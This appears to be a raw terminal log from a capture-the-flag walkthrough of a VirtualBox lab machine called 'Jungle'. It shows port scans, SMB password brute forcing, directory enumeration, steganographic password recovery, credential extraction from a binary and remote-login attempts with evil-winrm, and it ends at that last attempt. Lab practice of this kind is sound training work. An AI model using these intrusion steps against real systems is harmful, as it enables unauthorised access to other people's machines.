┌──(kali㉿kali)-[~/Documents/Jungle]
└─$ nmap -sS -p- --open --min-rate 5000 -n -Pn 192.168.69.4 -oN scan.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 15:34 EDT
Nmap scan report for 192.168.69.4
Host is up (0.00032s latency).
Not shown: 59194 closed tcp ports (reset), 6328 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
MAC Address: 08:00:27:E4:F0:93 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 12.82 seconds
                                                                                                                                          
┌──(kali㉿kali)-[~/Documents/Jungle]
└─$ grep '^[0-9]' scan.txt | cut -d '/' -f1 | sort -u | xargs | tr ' ' ','
135,139,445,47001,49664,49665,49666,49667,49668,49669,49670,5985,80
                                                                                                                                          
┌──(kali㉿kali)-[~/Documents/Jungle]
└─$ nmap -sVC -p135,139,445,47001,49664,49665,49666,49667,49668,49669,49670,5985,80 -n -Pn -vvv 192.168.69.4 -oN fullscan.txt 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 15:36 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:36
Completed NSE at 15:36, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:36
Completed NSE at 15:36, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:36
Completed NSE at 15:36, 0.00s elapsed
Initiating ARP Ping Scan at 15:36
Scanning 192.168.69.4 [1 port]
Completed ARP Ping Scan at 15:36, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:36
Scanning 192.168.69.4 [13 ports]
Discovered open port 139/tcp on 192.168.69.4
Discovered open port 445/tcp on 192.168.69.4
Discovered open port 135/tcp on 192.168.69.4
Discovered open port 80/tcp on 192.168.69.4
Discovered open port 49667/tcp on 192.168.69.4
Discovered open port 49670/tcp on 192.168.69.4
Discovered open port 49664/tcp on 192.168.69.4
Discovered open port 47001/tcp on 192.168.69.4
Discovered open port 49665/tcp on 192.168.69.4
Discovered open port 5985/tcp on 192.168.69.4
Discovered open port 49669/tcp on 192.168.69.4
Discovered open port 49668/tcp on 192.168.69.4
Discovered open port 49666/tcp on 192.168.69.4
Completed SYN Stealth Scan at 15:36, 0.02s elapsed (13 total ports)
Initiating Service scan at 15:36
Scanning 13 services on 192.168.69.4
Service scan Timing: About 53.85% done; ETC: 15:38 (0:00:46 remaining)
Completed Service scan at 15:37, 53.59s elapsed (13 services on 1 host)
NSE: Script scanning 192.168.69.4.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:37
Completed NSE at 15:37, 5.26s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:37
Completed NSE at 15:37, 0.04s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:37
Completed NSE at 15:37, 0.00s elapsed
Nmap scan report for 192.168.69.4
Host is up, received arp-response (0.00043s latency).
Scanned at 2025-09-23 15:36:22 EDT for 59s

PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 128 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Welcome to the Jungle - The Hex Guns
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 128
5985/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
MAC Address: 08:00:27:E4:F0:93 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-23T19:37:18
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 64570/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 24752/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 49544/udp): CLEAN (Timeout)
|   Check 4 (port 55758/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: THEHEXGUNS, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:e4:f0:93 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| Names:
|   THEHEXGUNS<00>       Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   THEHEXGUNS<20>       Flags: <unique><active>
| Statistics:
|   08:00:27:e4:f0:93:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 0s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:37
Completed NSE at 15:37, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:37
Completed NSE at 15:37, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:37
Completed NSE at 15:37, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.90 seconds
           Raw packets sent: 14 (600B) | Rcvd: 14 (600B)
                                                                                                                                          
┌──(kali㉿kali)-[~/Documents/Jungle]
└─$ netexec smb 192.168.69.4                                                                                                  
SMB         192.168.69.4    445    THEHEXGUNS       [*] Windows Server 2022 Build 20348 x64 (name:THEHEXGUNS) (domain:thehexguns) (signing:False) (SMBv1:False)                                                                                                                                                         
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Jungle]
└─$ sudo nano /etc/hosts      
[sudo] password for kali: 
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Jungle]
└─$ smbclient //192.168.69.4 -N

\\192.168.69.4: Not enough '\' characters in service
Usage: smbclient [-?EgqBNPkV] [-?|--help] [--usage] [-M|--message=HOST] [-I|--ip-address=IP] [-E|--stderr] [-L|--list=HOST] [-T|--tar=<c|x>IXFvgbNan]
        [-D|--directory=DIR] [-c|--command=STRING] [-b|--send-buffer=BYTES] [-t|--timeout=SECONDS] [-p|--port=PORT] [-g|--grepable] [-q|--quiet]
        [-B|--browse] [-d|--debuglevel=DEBUGLEVEL] [--debug-stdout] [-s|--configfile=CONFIGFILE] [--option=name=value] [-l|--log-basename=LOGFILEBASE]
        [--leak-report] [--leak-report-full] [-R|--name-resolve=NAME-RESOLVE-ORDER] [-O|--socket-options=SOCKETOPTIONS] [-m|--max-protocol=MAXPROTOCOL]
        [-n|--netbiosname=NETBIOSNAME] [--netbios-scope=SCOPE] [-W|--workgroup=WORKGROUP] [--realm=REALM] [-U|--user=[DOMAIN/]USERNAME[%PASSWORD]]
        [-N|--no-pass] [--password=STRING] [--pw-nt-hash] [-A|--authentication-file=FILE] [-P|--machine-pass] [--simple-bind-dn=DN]
        [--use-kerberos=desired|required|off] [--use-krb5-ccache=CCACHE] [--use-winbind-ccache] [--client-protection=sign|encrypt|off] [-k|--kerberos]
        [-V|--version] [OPTIONS] service <password>
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Jungle]
└─$ smbclient -I //192.168.69.4 -N
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Jungle]
└─$ smbclient -L //192.168.69.4 -N
session setup failed: NT_STATUS_ACCESS_DENIED
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Jungle]
└─$ netexec smb 192.168.69.4 -u slash -p /usr/share/wordlists/rockyou.txt


=============================================================================================================================================================================================


┌──(kali㉿kali)-[~/Documents/Jungle]
└─$ gobuster dir -u http://192.168.69.4 -x php,html,css,js,txt,pdf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.69.4
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404,403
[+] User Agent:              gobuster/3.6
[+] Extensions:              pdf,php,html,css,js,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 1209]
/img                  (Status: 301) [Size: 158] [--> http://192.168.69.4/img/]
/media                (Status: 301) [Size: 160] [--> http://192.168.69.4/media/]
/header.php           (Status: 200) [Size: 189]
/footer.php           (Status: 200) [Size: 81]
/albums.php           (Status: 200) [Size: 1915]
/css                  (Status: 301) [Size: 158] [--> http://192.168.69.4/css/]
/Index.php            (Status: 200) [Size: 1209]
/Media                (Status: 301) [Size: 160] [--> http://192.168.69.4/Media/]
/IMG                  (Status: 301) [Size: 158] [--> http://192.168.69.4/IMG/]
/Header.php           (Status: 200) [Size: 189]
/INDEX.php            (Status: 200) [Size: 1209]
/CSS                  (Status: 301) [Size: 158] [--> http://192.168.69.4/CSS/]
/Img                  (Status: 301) [Size: 158] [--> http://192.168.69.4/Img/]
/Footer.php           (Status: 200) [Size: 81]
/MEDIA                (Status: 301) [Size: 160] [--> http://192.168.69.4/MEDIA/]
Progress: 820079 / 1543927 (53.12%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 821557 / 1543927 (53.21%)
=============================================================================================================================================================================================


                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Jungle]
└─$ gobuster dir -u http://192.168.69.4/media/ -x mp3,mp4,php,html,css,js,txt,pdf,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.69.4/media/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,css,js,txt,rar,mp3,mp4,pdf,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/songs.zip            (Status: 200) [Size: 3918]
/Songs.zip            (Status: 200) [Size: 3918]
Progress: 1126853 / 2426171 (46.45%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 1128185 / 2426171 (46.50%)
===============================================================
Finished
===============================================================


=============================================================================================================================================================================================                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Jungle]
└─$ wget http://192.168.69.4/media/songs.zip   
--2025-09-23 15:55:55--  http://192.168.69.4/media/songs.zip
Connecting to 192.168.69.4:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3918 (3.8K) [application/x-zip-compressed]
Saving to: ‘songs.zip’

songs.zip                              100%[============================================================================>]   3.83K  --.-KB/s    in 0s      

2025-09-23 15:55:55 (566 MB/s) - ‘songs.zip’ saved [3918/3918]

                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Jungle]
└─$ ls
fullscan.txt  scan.txt  songs.zip

=============================================================================================================================================================================================


┌──(kali㉿kali)-[~/Documents/Jungle]
└─$ cd songs 
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Jungle/songs]
└─$ ls
digital_destruction.txt  neon_rebellion.txt  paradaise_404.txt  solo_final.wav
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Jungle/songs]
└─$ cat digital_destruction.txt 
Binary burns through the wires,
1s and 0s flying higher...
# nothing special here
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Jungle/songs]
└─$ cat neon_rebellion.txt     
Rise against the static tide,
firewalls can't stop our ride.
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Jungle/songs]
└─$ cat paradaise_404.txt 
They tried to hide, but we still found,
The jungle echoes with a sound...

There's always one password we’ve used since the first rehearsal...


=============================================================================================================================================================================================


https://github.com/RickdeJager/stegseek/releases



sudo apt install ./stegseek_0.6-1.deb



clave desbloqueo:       thehexguns


┌──(kali㉿kali)-[~/Documents/Jungle/songs]
└─$ stegseek solo_final.wav pass.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "thehexguns"
[i] Original filename: "password.txt".
[i] Extracting to "solo_final.wav.out".

                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Jungle/songs]
└─$ ls
digital_destruction.txt  neon_rebellion.txt  palabras2.txt  palabras.txt  paradaise_404.txt  pass.txt  solo_final.wav  solo_final.wav.out
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Jungle/songs]
└─$ cat solo_final.wav.out 
Password:sweetjungle2025
URL:theh3xgun5
                   


=============================================================================================================================================================================================


http://192.168.69.4/theh3xgun5/panel.php

usuario:        slash
clave:          sweetjungle2025



Descargar el archivo commlink.exe


=============================================================================================================================================================================================


┌──(kali㉿kali)-[~/Documents/Jungle]
└─$ strings commlink.exe | grep -i -E "flag|key|password|secret|ctf|jungle|paradise|404|user|users"

axl password: SoloMaster2025
__setusermatherr
ExceptionFlags
ContextFlags
EFlags
ArbitraryUserPointer
2JOB_OBJECT_NET_RATE_CONTROL_FLAGS
JOB_OBJECT_NET_RATE_CONTROL_VALID_FLAGS
VT_USERDEFINED
__mingw_setusermatherr
JOB_OBJECT_NET_RATE_CONTROL_FLAGS
JOB_OBJECT_NET_RATE_CONTROL_VALID_FLAGS
VT_USERDEFINED
JOB_OBJECT_NET_RATE_CONTROL_FLAGS
JOB_OBJECT_NET_RATE_CONTROL_VALID_FLAGS
VT_USERDEFINED
JOB_OBJECT_NET_RATE_CONTROL_FLAGS
        JOB_OBJECT_NET_RATE_CONTROL_VALID_FLAGS
_flag
JOB_OBJECT_NET_RATE_CONTROL_FLAGS
JOB_OBJECT_NET_RATE_CONTROL_VALID_FLAGS
VT_USERDEFINED
_flag
flags
fUserMathErr
stUserMathErr
__setusermatherr
__mingw_setusermatherr
ExceptionFlags
ContextFlags
EFlags
JOB_OBJECT_NET_RATE_CONTROL_FLAGS
JOB_OBJECT_NET_RATE_CONTROL_VALID_FLAGS
VT_USERDEFINED
JOB_OBJECT_NET_RATE_CONTROL_FLAGS
JOB_OBJECT_NET_RATE_CONTROL_VALID_FLAGS
Flags
__mingwthr_key_t
__mingwthr_key
key_dtor_list
keyp
$__mingwthr_run_key_dtors
keyp
___w64_mingwthr_remove_key_dtor
        key
prev_key
cur_key
___w64_mingwthr_add_key_dtor
        key
new_key
LoaderFlags
_flag
_flag
flags
flags
3JOB_OBJECT_NET_RATE_CONTROL_FLAGS
JOB_OBJECT_NET_RATE_CONTROL_VALID_FLAGS
Flags
_flag
JOB_OBJECT_NET_RATE_CONTROL_FLAGS
JOB_OBJECT_NET_RATE_CONTROL_VALID_FLAGS
Flags
VT_USERDEFINED
JOB_OBJECT_NET_RATE_CONTROL_FLAGS
JOB_OBJECT_NET_RATE_CONTROL_VALID_FLAGS
VT_USERDEFINED
_flag
LoaderFlags
./mingw-w64-crt/crt/usermatherr.c
usermatherr.c
usermatherr.c
usermatherr.c
stUserMathErr
__mingw_setusermatherr
__mingwthr_run_key_dtors.part.0
key_dtor_list
___w64_mingwthr_add_key_dtor
___w64_mingwthr_remove_key_dtor
__imp___setusermatherr
__setusermatherr
__loader_flags__


=============================================================================================================================================================================================



┌──(kali㉿kali)-[~/Documents/Jungle]
└─$ netexec smb 192.168.69.4 -u 'axl'  -p 'SoloMaster2025' 
SMB         192.168.69.4    445    THEHEXGUNS       [*] Windows Server 2022 Build 20348 x64 (name:THEHEXGUNS) (domain:thehexguns) (signing:False) (SMBv1:False)                                                                                                                                                         
SMB         192.168.69.4    445    THEHEXGUNS       [-] thehexguns\axl:SoloMaster2025 STATUS_PASSWORD_EXPIRED 


=============================================================================================================================================================================================
┌──(kali㉿kali)-[~/Documents/Jungle]
└─$ netexec winrm 192.168.69.4 -u 'axl'  -p 'SoloMaster2025' 
WINRM       192.168.69.4    5985   THEHEXGUNS       [*] Windows Server 2022 Build 20348 (name:THEHEXGUNS) (domain:thehexguns)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.69.4    5985   THEHEXGUNS       [-] thehexguns\axl:SoloMaster2025
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Jungle]
└─$  evil-winrm -i 192.168.69.69 -u 'axl'  -p 'SoloMaster2025'          
                                        
